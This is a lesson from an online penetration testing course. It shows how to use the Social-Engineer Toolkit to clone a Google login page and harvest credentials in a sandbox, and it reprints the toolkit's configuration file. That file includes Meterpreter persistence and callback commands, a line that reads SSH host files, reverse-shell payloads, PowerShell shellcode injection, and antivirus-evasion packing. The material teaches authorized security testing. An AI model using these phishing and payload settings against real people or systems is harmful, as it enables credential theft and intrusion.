# Using_Social-Engineer_Toolkit_for_Effective_Social_Engineering_Attacks

Source: https://www.educative.io/courses/web-application-penetration-testing/social-engineer-toolkit-set

---

[Home](https://www.educative.io/)

[Courses](https://www.educative.io/search?tab=courses)

[Web Application Penetration Testing](https://www.educative.io/courses/web-application-penetration-testing)

# Social-Engineer Toolkit (SET)

Explore how to use the Social-Engineer Toolkit (SET) to perform various social engineering attacks, including credential harvesting via cloned websites. Understand how SET automates attack vectors, enabling penetration testers to identify risks by simulating phishing, spoofing, and other tactics targeting human weaknesses in information security.

We'll cover the following...

- [What is the SET?](https://www.educative.io/courses/web-application-penetration-testing/social-engineer-toolkit-set#What-is-the-SET)
- [Using the SET to harvest credentials](https://www.educative.io/courses/web-application-penetration-testing/social-engineer-toolkit-set#Using-the-SET-to-harvest-credentials)
- [What else can the SET do?](https://www.educative.io/courses/web-application-penetration-testing/social-engineer-toolkit-set#What-else-can-the-SET-do)

## What is the SET?[#](https://www.educative.io/courses/web-application-penetration-testing/social-engineer-toolkit-set#What-is-the-SET)

**Social engineering** is sometimes referred to as the art or science of manipulation. Since it involves the human element, social engineering attacks need to be highly flexible and attackers need to switch strategies on the fly, especially when aiming for particularly high-profile or difficult targets. After conducting due research on their target, the attacker plays off deep, human-rooted impulses, such as fear, anxiety, desire, and empathy. The attacker hijacks the target’s train of thought and manipulates them to do their bidding without giving themselves away.

In order to automate the ever-changing vectors of social engineering attacks, cybersecurity firm TrustedSec released the [Social-Engineer Toolkit](https://github.com/trustedsec/social-engineer-toolkit) (SET). Ever since its release, it has gained a huge following, and many of the previously discussed types of social engineering attacks can now be performed in a few button presses.

The SET can be used to perform a variety of social engineering attacks. Unfortunately, most of these attack vectors involve the Windows operating system or Windows versions of software. Therefore, we’ll only be able to see a limited potential of its power.

## Using the SET to harvest credentials[#](https://www.educative.io/courses/web-application-penetration-testing/social-engineer-toolkit-set#Using-the-SET-to-harvest-credentials)

Credential harvesting refers to the act of amassing a stockpile of data, which can then be used to gain unauthorized access to systems. Actor vectors generally include man-in-the-middle attacks (sniffing packets if the site isn’t on HTTPS), phishing, and DNS poisoning.

The SET allows users to easily harvest credentials by cloning the login pages of popular websites and then capturing the data entered by unsuspecting users. While the attack is not that sophisticated, combined with spoofing and robust custom styling, even careful users may be caught in the trap.

Let’s try it out in the playground below:

1. Click the “Run” button.
2. Launch the SET by entering `setoolkit`.
3. Accept the terms and conditions.
4. Select the “Social-Engineering Attacks” option.
5. Select the “Website Attack Vectors” option.
6. Select the “Credential Harvester Attack Method” option.
7. Select the “Web Templates” option.
8. Since we can’t play around with port forwarding on the platform, we’ll have to test this out using the local IP address of the machine that’s running the terminal. In other words, if any other machine in the local network were to go to the clone’s host’s IP address in the browser, they’d be sent to the malicious site. As such, simply press “Enter” or enter “172.17.0.2” manually.
9. Select the “Google” option.
10. Navigate to the “Output” tab, and go to either “localhost” or “172.17.0.2” in Chrome.
11. Enter arbitrary login details, and try to log in.

We’ll see the login details in the terminal because the information was carried over in plaintext due to HTTP, and we captured it.

> **Note:** For those who’d like the malicious site to be available as a public address, use something like [Ngrok to tunnel](https://ngrok.com/) via the relevant port (`80` in our case).

```
##################################################################################################
##################################################################################################
##                                                                                              ##
## The following config file will allow you to customize settings within                        ##
## the Social-Engineer Toolkit. The lines that do not have comment code                                    ##
## ("#") are the fields you want to toy with. They are pretty easy to                                   ##
## understand.                                                                                                                         ##
##                                                                                                                                      ##
## The Metasploit path is the default path for where Metasploit is located.                                ##
## Metasploit is required for SET to function properly.                                                         ##
##                                                                                                                                  ##
## The "ETTERCAP" option specifies if you want to use ARP cache poisoning in                        ##
## conjunction with the web attacks; note that ARP cache poisoning is only                          ##
## for internal subnets only and does not work against people on the Internet.                  ##
##                                                                                                                              ##
## The "SENDMAIL" option allows you to spoof source IP addresses utilizing an                   ##
## program called Sendmail. Sendmail is not installed by default on Kali.                               ##
## To spoof email addresses when performing the mass email attacks, you must                    ## 
## install Sendmail manually using the command: "apt-get install sendmail"                          ##
#                                                                                                                           ##
## Note that "ETTERCAP" and "SENDMAIL" options only accept ON or OFF switches.                  ##
##                                                                                                                                      ##
## Note that the "Metasploit_PATH" option cannot have a '/' after the folder name.                     ##
##                                                                                                                          ##
## There are additional options; read the comments for additional descriptions.                     ##
##                                                                                                                                             ##
## CONFIG_VERSION=7.7.9                                                                                                            ##
##                                                                                                                              ##
##################################################################################################
##################################################################################################
#
### Define the path to Metasploit. For example: /opt/metasploit/apps/pro/msf3
METASPLOIT_PATH=/opt/metasploit/apps/pro/msf3
#
### This will tell what database to use when using Metasploit. The default is PostgreSQL.
METASPLOIT_DATABASE=postgresql
#
### Define how many times SET should encode a payload if you are using standard Metasploit encoding options.
ENCOUNT=4
#
### If this option is set, the Metasploit payloads will automatically migrate to
### Notepad once the applet is executed. This is beneficial if the victim closes
### the browser; however, this can introduce buggy results when auto migrating.
### Note that this will make bypassuac not work properly. Migrate to a different process to get it to work.
AUTO_MIGRATE=OFF
#
### Here, we can run multiple Meterpreter scripts once a session is active. This
### may be important if we are sleeping and need to run persistence, elevate
### permissions, or complete other tasks in an automated fashion. First, turn this trigger on, and
### then configure the options. Note that you need to separate the commands by a ';'.
METERPRETER_MULTI_SCRIPT=OFF
LINUX_METERPRETER_MULTI_SCRIPT=OFF
#
### Determine what commands you want to run once a Meterpreter session has been established.
### If you want multiple commands, separate them by a ';'. For example you could do
### "run getsystem;run hashdump;run persistence" to run three different commands.
METERPRETER_MULTI_COMMANDS=run persistence -r 192.168.1.5 -p 21 -i 300 -X -A;getsystem
LINUX_METERPRETER_MULTI_COMMANDS=uname;id;cat ~/.ssh/known_hosts
#
### This is the port that is used for iFrame injection when using the Metasploit browser attacks.
### By default, this port is 8080; however, egress filtering may block this. You may want to adjust to
### something like 21 or 53.
METASPLOIT_IFRAME_PORT=8080
#
### Define whether or not to use Ettercap for the website attack.
ETTERCAP=OFF
#
### Ettercap home directory (needed for DNS_spoof).
ETTERCAP_PATH=/usr/share/ettercap
#
### Specify what interface you want Ettercap or dsniff to listen on.
ETTERCAP_INTERFACE=eth0
#
### Define whether or not to use dsniff for the website attack.
### If dsniff is set to on, Ettercap will be automatically disabled.
DSNIFF=OFF
#
### Autodetection of IP address interface utilizing Google.
AUTO_DETECT=OFF
#
### Define whether or not to use Sendmail for spoofing emails. 
SENDMAIL=OFF
#
### The email providers supported are Gmail, Hotmail, and Yahoo.
EMAIL_PROVIDER=GMAIL
#
### Turn on if you want to use email in conjunction with the web attack. 
WEBATTACK_EMAIL=OFF
#
### Web attack time delay between emails. The default is one second.
TIME_DELAY_EMAIL=1
#
### Use Apache instead of the standard Python web server. This will increase the speed
### of the attack vector.
APACHE_SERVER=ON
#
### Path to the Apache web root.
APACHE_DIRECTORY=/var/www/html
#
### Specify what port to run the HTTP server on that serves the Java applet attack
### or Metasploit exploit. The default is port 80. If you are using Apache, you
### need to specify what port Apache is listening on in order for this to work properly.
WEB_PORT=80
#
### This flag will set the Java ID flag within the Java applet to something different.
### This could be to make it look more believable or for better obfuscation.
JAVA_ID_PARAM=Verified Trusted and Secure (VERIFIED)
#
### This option will continue to prompt the user with the Java applet if
### the user hits "cancel." This means the prompt will be non-stop until the applet is executed. This gives
### a better success rate for the Java applet attack.
JAVA_REPEATER=OFF
#
### This is the delay it takes between the user hitting "cancel" to
### when the next Java applet runs. Be careful with setting this too low as it will spawn them over
### and over even if they hit "run." 200 equals 2 seconds.
JAVA_TIME=200
#
### Turn on SSL/TLS certificates for secure SET communications through the web attack vector. Only use with built in not with APACHE_SERVER on.
WEBATTACK_SSL=OFF
#
### Path to the PEM file to utilize certificates with the web attack vector (required).
### You can create your own utilizing SET – just turn on SELF_SIGNED_CERT.
### If you're using this flag, ensure openSSL is installed! Turn SELF_SIGNED_CERT on. 
SELF_SIGNED_CERT=OFF
#
### Below is the client/server (private) cert; this must be in PEM format in order to work.
### Simply place the path you want. For example: /root/ssl_client/server.pem
PEM_CLIENT=/root/newcert.pem
PEM_SERVER=/root/newreq.pem
#
### Tweak the web jacking time used for the iFrame replace; sometimes it can be a little slow
### and harder to convince the victim. 5000 equals 5 seconds.
WEBJACKING_TIME=2000
#
### This will remove the SET interactive shell from the menu selection. The SET payloads are large in nature,
### and things like the Pwnie Express need smaller SET builds.
SET_INTERACTIVE_SHELL=ON
#
### These two options will turn the UPX packer on and automatically attempt
### to pack the executable which may evade anti-virus a little better.
UPX_ENCODE=OFF
UPX_PATH=/usr/bin/upx
#
### This will configure whether or not to use "EnableStageEncoding" within Metasploit payloads.
STAGE_ENCODING=OFF
#
### This feature will determine whether or not automatic redirection is used. By default, for example, in multi-attack,
### the site will redirect once one successful attack is used. Some people may want to use Java applet
### and credential harvester, for example.
AUTO_REDIRECT=ON
#
### This will redirect the harvester victim to this website once executed, rather than the original website.
### For example, if you clone "abcompany.com" and below it says "blahblahcompany.com," it will redirect there instead.
### This is useful if you want to redirect the victim to an additional site after harvester has taken the credentials.
### Simply enable harvester redirect, and then enter "http://websiteofyourchoosing.com" in the "HARVESTER_URL" below 
### to change.
HARVESTER_REDIRECT=OFF
HARVESTER_URL=http://thisisasite
#
### This will allow you to specify where the harvester log file goes when you use Apache. 
### By default, this will be in the "/var/www" directory.
HARVESTER_LOG=/var/www
#
### This will turn off the ability to log passwords in the credential harvester. Note that this isn't always
### reliable. It will only not present content that is password oriented. Otherwise, it will still
### show the content.
HARVESTER_LOG_PASSWORDS=ON
#
### This feature will auto embed an "img src" tag to a UNC path of your attack machine.
### This is useful if you want to intercept the half LM keys with rainbow tables. What will happen
### is as soon as the victim clicks the webpage link, a UNC path will be initiated,
### and the Metasploit "auxiliary/server/capture/smb" will intercept the hash values.
UNC_EMBED=OFF
#
### This feature will attempt to create a rogue access point and redirect victims back to the
### SET web server when associated.
ACCESS_POINT_SSID=linksys
AIRBASE_NG_PATH=/usr/local/sbin/airbase-ng
DNSSPOOF_PATH=/usr/local/sbin/dnsspoof
#
### This will configure the default channel that the wireless access point broadcasts through
### Wi-Fi communications.
AP_CHANNEL=9
#
### This will enable the PowerShell shellcode injection technique with each Java applet. It will be used as
### a second form in case the first method fails.
POWERSHELL_INJECTION=ON
#
### This will allow you to change the Metasploit payload to whatever you want based on the PowerShell alphanumeric
### injection attack. Specify this if PowerShell injection is enabled and you want to change it from the standard
### "reverse_https" attack. Note that all payloads use x86; the process will automatically downgrade to 32-bit.
POWERSHELL_INJECT_PAYLOAD_X86=windows/meterpreter/reverse_https
#
### This option will spray multiple ports through PowerShell in an effort to get a port outbound. 
### Note that PowerShell injection must be enabled.
POWERSHELL_MULTI_INJECTION=ON
#
### This will specify which ports to iterate through for the PowerShell injection. Note that if you are using SET,
### port 80 is used by the web server; the rest of ports should be open. If you want to use port 80,
### place the listener on a different server.
POWERSHELL_MULTI_PORTS=21,22,25,53,443
#
### This will display the output of the PowerShell injection attack so you can see what is being placed
### on the system.
POWERSHELL_VERBOSE=OFF
#
### This will profile the victim machine, check for installed versions, and report back on them.
### Note that this is currently disabled; development is underway on this feature.
WEB_PROFILER=OFF
#
### Port numbers for the Java applet Linux and OSX attacks; reverse payloads also allow you to specify
### what payload you want.
DEPLOY_OSX_LINUX_PAYLOADS=OFF
OSX_REVERSE_PORT=8080
LINUX_REVERSE_PORT=8081
OSX_PAYLOAD_DELIVERY=osx/x86/shell_reverse_tcp
LINUX_PAYLOAD_DELIVERY=linux/x86/meterpreter/reverse_tcp
#
### Determine whether or not to use a custom OSX and Linux payload.
CUSTOM_LINUX_OSX_PAYLOAD=OFF
#
### This will use a custom plist for persistence on OSX.
ENABLE_PERSISTENCE_OSX=OFF
#
### Determines what user agent string to use fo ranything that clones the website. 
USER_AGENT_STRING=Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36
#
### The SET interactive shell works by first deploying a stager payload that pulls an additional executable.
### The downloader is currently being picked up by anti-virus and is actually somewhat hard to obfuscate because it has 
### similar characteristics of a download and execute. If you turn this feature on, SET will download the interactive shell
### straight without using the stager. The only issue with this is that there may be a delay on the user's end, but it still 
### shouldn't be noticed.
SET_SHELL_STAGER=OFF
#
### Turn this off if you don't want a Metasploit listener in the background.
AUTOMATIC_LISTENER=ON
#
### This will disable Metasploit functionality if it is not installed, and you just want to use SET or RATTE for payloads
### or the other attack vectors.
METASPLOIT_MODE=ON
#
### This will turn off the deployment of binaries for the Java applet attack and only use the PowerShell method.
DEPLOY_BINARIES=NO
#
### This is for debugging purposes only. This will remove the cleanup functionality within SET to debug file states.
CLEANUP_ENABLED_DEBUG=OFF
#
### When sending out emails, SET will add a url and keep track of the email addresses on each unique link. This will help you find
### who clicked on the link. This works on all web-based and spear-phishing attacks.
### 
### Note that in order for this to work, you must enable "WEBATTACK_EMAIL" and "APACHE_SERVER".
TRACK_EMAIL_ADDRESSES=OFF
#
### This allows you to start a DNS server in SET. All responses will redirect to the SET instance which can launch attack vectors.
DNS_SERVER=OFF
#
### This will turn on bleeding edge repositories if you are using Kali Linux. Use at your own risk – they tend to be unstable.
#
BLEEDING_EDGE=OFF
#
### This will download 1 deep the website with WGET instead of the standard. This may give better results but takes longer
WGET_DEEP=OFF

##########################################
```

## What else can the SET do?[#](https://www.educative.io/courses/web-application-penetration-testing/social-engineer-toolkit-set#What-else-can-the-SET-do)

The SET is capable of a lot more than just the phishing example that we just went through. We could use the SET to create malware files, email these files to users, spoof the email identification details, create QR codes that can redirect users to our malicious sites, set up a Wi-Fi access point that sniffs for the data of unsuspecting users, and even use a number of obscure exploits.

With this many tools under the pentester’s belt, practice and knowledge are key to identifying when to perform which attack. This also goes doubly so for tools. Metasploit has a larger repository of exploits and scanners than the SET and even supports more platforms, but its approach bypasses the human element.

Social Engineering

Man-in-the-Middle (MITM) Attacks

Ask

[What is the SET?](https://www.educative.io/courses/web-application-penetration-testing/social-engineer-toolkit-set#What-is-the-SET)

[Using the SET to harvest credentials](https://www.educative.io/courses/web-application-penetration-testing/social-engineer-toolkit-set#Using-the-SET-to-harvest-credentials)

[What else can the SET do?](https://www.educative.io/courses/web-application-penetration-testing/social-engineer-toolkit-set#What-else-can-the-SET-do)